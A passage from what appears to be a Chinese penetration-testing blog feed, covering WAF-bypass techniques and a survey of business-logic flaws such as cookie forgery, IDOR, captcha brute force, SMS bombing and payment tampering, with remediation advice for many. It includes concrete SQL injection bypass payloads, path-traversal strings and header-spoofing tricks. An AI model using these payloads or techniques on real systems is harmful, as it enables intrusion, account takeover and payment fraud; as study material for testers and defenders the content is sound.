可结合注释符使用%23%0a，%2d%2d%0a。</p><p>（3）内联注释：</p><p>  <code>/*!UnIon12345SelEcT*/ 1,user()</code>  </p><p>  &#x2F;&#x2F;数字范围 1000-50540</p><p>（4）mysql黑魔法</p><p>  <code>select&#123;x username&#125;from&#123;x11 test.admin&#125;;</code></p><h4 id="SQL-Server技巧"><a href="#SQL-Server技巧" class="headerlink" title="SQL Server技巧"></a>SQL Server技巧</h4><p>（1）用来注释掉注射后查询的其余部分：</p><p>  &#x2F;*    C语言风格注释</p><p>  –    SQL注释</p><p>  ; 00％ 空字节</p><p>（2）空白符：[0x01-0x20]</p><p>（3）特殊符号：%3a 冒号</p><p>   id&#x3D;1 union:select 1,2 from:admin</p><p>（4）函数变形：如<code>db_name[空白字符]()</code></p><h4 id="Oracle技巧"><a href="#Oracle技巧" class="headerlink" title="Oracle技巧"></a>Oracle技巧</h4><p>（1）注释符：–、&#x2F;**&#x2F;</p><p>（2）空白字符：[0x00, 0x09, 0x0a-0x0d, 0x20]</p><h4 id="配合FUZZ"><a href="#配合FUZZ" class="headerlink" title="配合FUZZ"></a>配合FUZZ</h4><p>select * from admin where id&#x3D;1【位置一】union【位置二】</p><p>select【位置三】1,2,db_name()【位置四】from【位置五】admin</p><h3 id="逻辑层"><a href="#逻辑层" class="headerlink" title="逻辑层"></a>逻辑层</h3><h4 id="逻辑问题"><a href="#逻辑问题" class="headerlink" title="逻辑问题"></a>逻辑问题</h4><p>（1）云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</p><p>（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</p><p>（3）HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</p><p>（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。</p><p>比如：<code>id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</code></p><h4 id="性能问题"><a href="#性能问题" class="headerlink" title="性能问题"></a>性能问题</h4><p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p><p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p><p>例子1：</p><p>?id&#x3D;1 and (select 1)&#x3D;(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p><p>PS：0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</p><p>例子2：</p><p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata</p><p>备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p><strong>方式一：IP白名单</strong></p><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：修改http的header来bypass waf</p><p>X-forwarded-for</p><p>X-remote-IP</p><p>X-originating-IP</p><p>x-remote-addr</p><p>X-Real-ip</p><p><strong>方式二：静态资源</strong></p><p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p><p><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p><p>备注：Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php 后面基本不识别</p><p><strong>方式三：url白名单</strong></p><p>为了防止误拦，部分waf内置默认的白名单列表，如</p><p>admin&#x2F;manager&#x2F;system等管理后台。</p><p>只要url中存在白名单的字符串，就作为白名单不进行检测。</p><p><strong>常见的url构造：</strong></p><p><code>http://10.9.9.201/sql.php/admin.php?id=1</code></p><p><code>http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd</code></p><p><code>http://10.9.9.201/../../../manage/../sql.asp?id=2</code></p><p>waf通过&#x2F;manage&#x2F;“进行比较，只要uri中存在&#x2F;manage&#x2F;就作为白名单不进行检测，这样我们可以通过&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwd 绕过防御规则。</p><p><strong>方式四：爬虫白名单</strong></p><p>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</p><p>1、 根据UserAgent  2、通过行为来判断</p><p>UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。</p><p>User Agent Switcher (Firefox 附加组件)，下载地址：<a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/">https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/</a></p><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><h3 id="整合绕过"><a href="#整合绕过" class="headerlink" title="整合绕过"></a>整合绕过</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;WAF简介&quot;&gt;&lt;a href=&quot;#WAF简介&quot; class=&quot;headerlink&quot; title=&quot;WAF简介&quot;&gt;&lt;/a&gt;WAF简介&lt;/h2&gt;&lt;h3 id=&quot;功能&quot;&gt;&lt;a href=&quot;#功能&quot; class=&quot;headerlink&quot; title=&quot;功能&quot;&gt;&lt;/a&gt;功</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://frankcao3.github.io/posts/45471"/>
    <id>https://frankcao3.github.io/posts/45471</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.975Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p>参考：<a href="https://www.freebuf.com/vuls/281141.html">https://www.freebuf.com/vuls/281141.html</a></p><h2 id="身份验证漏洞"><a href="#身份验证漏洞" class="headerlink" title="身份验证漏洞"></a>身份验证漏洞</h2><h3 id="暴力破解漏洞"><a href="#暴力破解漏洞" class="headerlink" title="暴力破解漏洞"></a>暴力破解漏洞</h3><p>攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>系统登录点</p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>对于固定用户名爆破密码，可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码。但是不能永久锁定，可能被用来进行账户恶意锁定；</p><p>对于固定密码枚举用户名、 需要计算IP对URL的请求情况，若某个IP短时间大量请求登录则应该加入黑名单，对传输数据进行加密有一定的防护效果。</p><h3 id="Session固定攻击"><a href="#Session固定攻击" class="headerlink" title="Session固定攻击"></a>Session固定攻击</h3><p>会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人 。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在GET方法请求登录时候带有session值。</p><h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>避免在URL中带入session信息。</p><p>另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复。</p><h3 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h3><p>通过伪造cookie信息能够伪造其他用户进行登录。</p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>开发者为了方便将身份信息&#x2F;登录信息明文或者只是简单编码、哈希之后存放在cookies中，网站通过获取得到的cookies进行授权或者身份验证。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>cookie中有明显或者只是简单编码、哈希的字段时候，比如修改lsLogin值为1可以判定为用户已经登录，修改cookie为asp163&#x3D;UserName&#x3D;admin可以获得管理员权限。</p><h4 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h4><p>Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改。</p><h2 id="逻辑越权漏洞"><a href="#逻辑越权漏洞" class="headerlink" title="逻辑越权漏洞"></a>逻辑越权漏洞</h2><p>参考：</p><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123629813">https://blog.csdn.net/huangyongkang666/article/details/123629813</a></p><p><a href="https://www.freebuf.com/articles/web/195837.html">https://www.freebuf.com/articles/web/195837.html</a></p><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>越权访问（Broken Access Control，BAC），指应用在检查授权时存在漏洞，使得攻击者在获得低权限用户账号后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限的用户。</p><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>开发人员在对数据进行增删查改时，对客户端请求的数据过分相信而遗漏了权限的判定，权限验证不当而导致的越权行为。</p><p>通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。</p><ul><li>隐藏URL</li><li>直接对象引用</li><li>多阶段功能</li><li>静态文件</li><li>平台配置错误</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>水平越权是指攻击者尝试访问与他具有<strong>相同权限</strong>的用户资源。</p><p><strong>形成原因</strong>：在进行方法调用的时候未验证请求用户和目标信息拥有者是否匹配一致，而是直接用userid&#x2F;email之类的容易遍历的参数进行数据库查询，导致攻击者利用了其他人的userid。</p><p>比如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的行为就叫做水平越权访问。</p><p><strong>修复</strong>：利用getAttribute(“userid”)获取其userid，而不是直接接收userid参数，避免了userid参数传输。</p><p>以下是常出现的水平越权的几种场景：</p><ul><li><p>基于用户身份ID</p><p>在使用某个功能时，通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。</p></li><li><p>基于对象ID</p><p>在使用某个功能时，通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。</p></li><li><p>基于文件名</p><p>在使用某个功能时，通过文件名直接访问文件，最常见于用户上传文件的场景。</p></li></ul><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>垂直越权是指<strong>低权限用户尝试访问高权限用户</strong>的资源。</p><p><strong>形成原因</strong>：由于后台应用没有做权限控制、角色校验，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要<u>猜测其他管理页面的URL或者敏感的参数信息</u>，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。</p><p>主要有以下两种场景：</p><p>未认证账号，访问无需认证就能访问该功能</p><p>不具备某个功能权限的账户，认证后能成功访问该功能</p><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能，</p><p><strong>产生原因</strong>：系统设计期间没有进行全局用户身份校验；或者校验存在缺陷。</p><h2 id="业务数据篡改"><a href="#业务数据篡改" class="headerlink" title="业务数据篡改"></a>业务数据篡改</h2><p><strong>概念</strong>：篡改一些参数的数值，达到获利的目的。</p><p>若是篡改验证用的判断参数，比如判断用户类型的userType，可能用于实现垂直越权；</p><p>若是篡改用户参数，比如手机号、身份证号，可能用于实现水平越权。</p><p><strong>漏洞点</strong>：抽奖、购买、转账、返现等功能。</p><p><strong>修复</strong>：</p><p>计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改。</p><p>设置token。</p><h2 id="执行顺序逻辑漏洞"><a href="#执行顺序逻辑漏洞" class="headerlink" title="执行顺序逻辑漏洞"></a>执行顺序逻辑漏洞</h2><p><strong>概念</strong>：也是篡改参数，但是是通过<u>篡改分步逻辑中的步骤数字</u>，达到绕过支付、校验等效果。</p><p><strong>原理</strong>：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付。</p><p><strong>漏洞点</strong>：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中。</p><p><strong>修复</strong>：</p><p>在请求最后一步时候需要<u>带入前面的验证信息</u>，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作；</p><p>也可以通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验；</p><p>再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户。</p><h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><p><strong>概念</strong>：抓包后重放，进行参数值遍历。可以用于突破图形验证码的验证，可以实现如登录爆破、个人信息爆破、验证码绕过等攻击。</p><p><strong>修复：</strong></p><ul><li>验证码使用后立即重新生成</li><li>设置验证码有效期</li><li>验证码的部分仅使用图片，不使用字符串</li><li>不进行分布校验，而是连同请求数据一起发送到目标服务器进行校验</li></ul><h2 id="找回密码"><a href="#找回密码" class="headerlink" title="找回密码"></a>找回密码</h2><p><strong>概念</strong>：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全。</p><p>通过验证码找回密码的话，可以分为验证码漏洞的一种。</p><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h2><p><strong>实现</strong>：通过数据包重放实现。</p><p><strong>原理</strong>：后台未进行相关操作的计数导致数据包重放。</p><h2 id="其他逻辑漏洞"><a href="#其他逻辑漏洞" class="headerlink" title="其他逻辑漏洞"></a>其他逻辑漏洞</h2><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p><strong>概念</strong>：可以通过同时<u>重放大量数据包</u>进行漏洞利用，通常用于突破限量、限额的问题都有奇效。</p><p><strong>原理</strong>：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞。</p><p><strong>漏洞点</strong>：程序中存在限制，可以猜测到后台有判断与修改操作的方法</p><p><strong>修复</strong>：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程</p><p>并不是每个条件竞争都必须修复。</p><h3 id="数据包重放漏洞"><a href="#数据包重放漏洞" class="headerlink" title="数据包重放漏洞"></a>数据包重放漏洞</h3><p><strong>概念</strong>：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等。</p><p><strong>原理</strong>：后台未进行相关操作的计数导致数据包重放。</p><p><strong>漏洞点</strong>：短信验证码、邮件校验、提交订单等功能。</p><p><strong>修复</strong>：（针对短信、邮件）</p><p>构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数，只要某个邮箱或者电话号码次数够了，就不能继续发送了；或者计算两次发送的时间间隔，时间过短就不继续发送了</p><p><strong>通用修复方案</strong>：</p><p>需要建立<strong>token</strong>机制或验证码机制，一次有效。</p><h3 id="参数绑定漏洞"><a href="#参数绑定漏洞" class="headerlink" title="参数绑定漏洞"></a>参数绑定漏洞</h3><p><strong>概念</strong>：通过添加对象字段相关参数进行数据篡改</p><p><strong>原理</strong>：对象自动绑定被许多框架支持，它允许将HTTP请求参数自动的绑定到对象，开发者没有对其进行安全校验则容易导致数据篡改。</p><p><strong>漏洞点</strong>：常见的所有输入的地方都会出现这个漏洞，特别是金融、用户、缓存等。</p><p><strong>修复</strong>：Spring MVC中可以使用@InitBinder注释，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="举例（出现位置）"><a href="#举例（出现位置）" class="headerlink" title="举例（出现位置）"></a>举例（出现位置）</h2><p><strong>逻辑漏洞的问题可以分为前端和后端两个部分，总体思路都是先测试前端再测试后端。</strong></p><h3 id="注册处"><a href="#注册处" class="headerlink" title="注册处"></a>注册处</h3><p>注册功能可能出现任意用户注册、短信轰炸等问题。</p><p>以手机注册为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821141424493.png" alt="image-20220821141424493"></p><h4 id="前端参数验证的漏洞"><a href="#前端参数验证的漏洞" class="headerlink" title="前端参数验证的漏洞"></a>前端参数验证的漏洞</h4><p>注册时BP抓包，查看每个返回包有没有返回手机验证码或者存在true、false之类的判断语句，尝试将false修改为true，成功注册的话就绕过了前端验证。</p><p>拦截返回的响应包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821145657006.png" alt="image-20220821145657006"></p><h4 id="任意用户添加"><a href="#任意用户添加" class="headerlink" title="任意用户添加"></a>任意用户添加</h4><p>在未登录或者低权限的的情况下，利用数据包添加任意用户。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220912152818701.png" alt="image-20220912152818701"></p><h4 id="短信轰炸漏洞"><a href="#短信轰炸漏洞" class="headerlink" title="短信轰炸漏洞"></a>短信轰炸漏洞</h4><p>尝试重放发送验证码的包，查看手机是否在短时间内收到了多条短信，是的话则存在短信轰炸漏洞，这是因为后端没有对发送手机短信做时间限制。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821145912458.png" alt="image-20220821145912458"></p><h4 id="修改发送包手机号"><a href="#修改发送包手机号" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>首先用自己的手机收到正确验证码，在点击注册时拦截包将手机号改为其他手机号，如果成功的话就注册了别人的手机号，这是因为后端仅验证了验证码是否是正确的而没有验证验证码是否与手机匹配。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821150032637.png" alt="image-20220821150032637"></p><h3 id="登陆处"><a href="#登陆处" class="headerlink" title="登陆处"></a>登陆处</h3><p>登录处可能出现任意用户登录、验证码可绕过、用户账号可撞库等问题。</p><p>以手机验证码登录举例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821160800742.png" alt="image-20220821160800742"></p><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><p>对比正确登录和错误登录的包，对比返回包看是否有判断，尝试修改参数绕过前端验证。</p><h4 id="修改cookie实现垂直越权"><a href="#修改cookie实现垂直越权" class="headerlink" title="修改cookie实现垂直越权"></a>修改cookie实现垂直越权</h4><p>cookie的构造过于简单，可以分析出一部分参数，且通过前端JS文件可以判断出对该参数的校验。</p><p>比如发现前端文件内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params"></span>) <span class="comment">//login_ok.htm use</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;login=1&quot;</span>;</span><br><span class="line"><span class="title function_">MM_goToURL</span>(<span class="string">&#x27;parent&#x27;</span>, <span class="string">&#x27;home.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么将Cookie中的 login&#x3D;1 则会以管理员身份跳转 home.html，成功绕过登录。</p><h4 id="短信轰炸-1"><a href="#短信轰炸-1" class="headerlink" title="短信轰炸"></a>短信轰炸</h4><p>与注册处测试步骤一样</p><h4 id="验证码爆破-1"><a href="#验证码爆破-1" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>包括图片验证码和手机验证码。</p><p>先测试图片验证码，将使用正确验证码登录的包再重放一次，如果回显还是正确登录的话说明并没有对图片验证码进行限制，可以尝试撞库。</p><p>至于手机验证码，通常是尝试爆破，如果网站发到手机上的短信没有写什么在xx时间内有效之类的则有可能没有时间限制，将登录包右键发送至Intruder（即测试器模块）设置好爆破位置后在载荷里选择数值后这样填写。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821162352786.png" alt="image-20220821162352786"></p><p>通常范围是填写正确验证码所在的范围，爆破出来后就可以登录用户，对应着任意用户登录漏洞。</p><h4 id="修改发送包手机号-1"><a href="#修改发送包手机号-1" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>修改发送包手机号则和上面注册处修改发送包手机号步骤一样，不同的是上面注册处是为了测试任意用户注册，而这里登录处是为了测试任意用户登录，原理一样目的不同。</p><h4 id="修改用户参数"><a href="#修改用户参数" class="headerlink" title="修改用户参数"></a>修改用户参数</h4><p>查看正确登录包的返回包是否有用户id之类的参数，尝试修改该参数。（不嫌麻烦的话可以用两个正确登录的返回包对比）</p><p>拦截该请求的返回包修改返回包中的用户参数。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821162530220.png" alt="image-20220821162530220"></p><h3 id="密码找回处"><a href="#密码找回处" class="headerlink" title="密码找回处"></a>密码找回处</h3><p>密码找回处可能出现任意用户密码找回、验证码可绕过等问题。</p><p>以手机验证码找回为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821160553407.png" alt="image-20220821160553407"></p><h4 id="前端-1"><a href="#前端-1" class="headerlink" title="前端"></a>前端</h4><p>同样是修改返回包看是否能跳过验证步骤。</p><h4 id="验证码爆破-2"><a href="#验证码爆破-2" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>验证码爆破与上面登录处的验证码爆破操作一致。</p><h4 id="修改发送包手机号-2"><a href="#修改发送包手机号-2" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>与上面注册处的修改发送包手机号操作一致</p><h2 id="支付与越权"><a href="#支付与越权" class="headerlink" title="支付与越权"></a>支付与越权</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821163341791.png" alt="image-20220821163341791"></p><p>可以使用两个账号来对比测试，这样可以更快发现可疑参数。</p><p>支付接口指的是网站支付一般会有像微信支付、支付宝支付这种，一般网站会在支付的发送包里用某个参数标识。</p><p>登录时查看并测试用户信息返回接口指的是，在登录的时候，有的网站有个返回包是一个json数据包，该包内包含了用户敏感信息，此时就可以尝试修改发送包的用户参数，说不定就能获取其他用户的敏感信息。 </p><h2 id="权限框架缺陷"><a href="#权限框架缺陷" class="headerlink" title="权限框架缺陷"></a>权限框架缺陷</h2><p>权限控制框架是实现权限控制功能的基础（例如shiro），如果权限控制框架本身存在缺陷，那么就会导致权限控制功能完全失效。</p><h2 id="SRC中逻辑漏洞总结"><a href="#SRC中逻辑漏洞总结" class="headerlink" title="SRC中逻辑漏洞总结"></a>SRC中逻辑漏洞总结</h2><ol><li><p>注册：</p><ol><li>短信轰炸</li><li>验证码安全问题</li><li>密码爆破</li><li>邮箱轰炸</li></ol></li><li><p>用户任意注册、批量注册</p></li><li><p>用户名枚举</p></li><li><p>XSS（有框的地方就可以尝试插XSS）</p></li><li><p>登录：</p><ol><li>短信轰炸、验证码安全问题、密码爆破、邮箱轰炸</li><li>SQL注入</li><li>撞库</li><li>抓包把password字段修改为空值发送</li><li>认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号</li><li>Cookie仿冒</li><li>修改返回包的相关数据，可能会登陆到其他的用户</li></ol></li><li><p>找回密码：</p><ol><li>短信邮箱轰炸、短信邮箱劫持</li><li>重置任意用户账户密码、验证码手机用户未统一验证</li><li>直接跳过验证步骤</li></ol></li><li><p>购买支付、充值（要利用抓包去仔细查看每一个可用的参数）</p><ol><li>交易金额、数量修改、更换支付模块（比如更换支付的模块金额）</li><li>交易信息订单编码&#x2F;导致信息泄露</li><li>整数溢出，int最大值为2147483647，超过最大值</li><li>修改充值账户</li><li>支付绕过</li></ol></li><li><p>抽奖活动</p><ol><li>刷奖品、积分</li><li>并发</li></ol></li><li><p>优惠卷、代金卷</p><ol><li>并发逻辑漏洞（burp批量获取优惠券）</li><li>修改优惠券金额、数量</li></ol></li><li><p>订单信息</p><ol><li>订单信息遍历、泄露</li><li>订单信息泄露导致用户信息泄露</li><li>删出他人订单</li></ol></li><li><p>会员系统</p><ol><li>修改个人信息上传文件，上传带弹窗的html</li><li>如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测</li><li>图片上传也可能遇到imagereagick命令执行，上传恶意图片</li><li>视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf</li><li>用户横向越权访问、遍历、导致用户信息泄露</li><li>SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS</li></ol></li><li><p>传输过程</p></li><li><p>明文传输账户密码</p></li><li><p>修改信息处无session&#x2F;token导致csrf</p></li><li><p>POST&#x2F;COOKIE注入</p></li><li><p>评论</p></li><li><p>POST注入</p></li><li><p>存储型XSS</p></li><li><p>无session&#x2F;token导致CSRF</p></li><li><p><strong>验证码问题</strong></p><ol><li>万能验证码</li><li>返回包中存在验证码</li><li>删除验证码或者cookie中的值可以爆破账号密码</li></ol></li><li><p><strong>短信轰炸</strong></p><ol><li>一直重放</li><li>删除修改cookie，重放数据包</li><li>遍历参数发送数据包</li><li>手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包</li><li>请求参数修改大小写，或者添加请求参数比如&amp;id&#x3D;1</li><li>一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口</li><li>如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显</li></ol></li><li><p><strong>水平越权</strong></p><ol><li>主要登陆后还是修改参数，主要找到多个接口不断测试</li><li>关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测</li><li>多个账号，主要分析请求参数</li></ol></li><li><p><strong>数据泄露</strong></p><p>在找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回</p></li><li><p><strong>任意用户密码重置</strong></p><ol><li>目前大部分都是在修改密码处参数修改</li><li>有些是前端验证</li></ol></li></ol><p><strong>支付逻辑漏洞</strong></p><ol><li>边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户</li><li>顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。</li><li>金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包</li><li>确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。</li><li>请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。</li><li>请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。</li><li>订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。</li><li>欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家</li><li>单位替换：产生在paypal类似的国际支付的场景。</li><li>用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西</li><li>强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。</li><li>秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。</li><li>函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。</li><li>heart 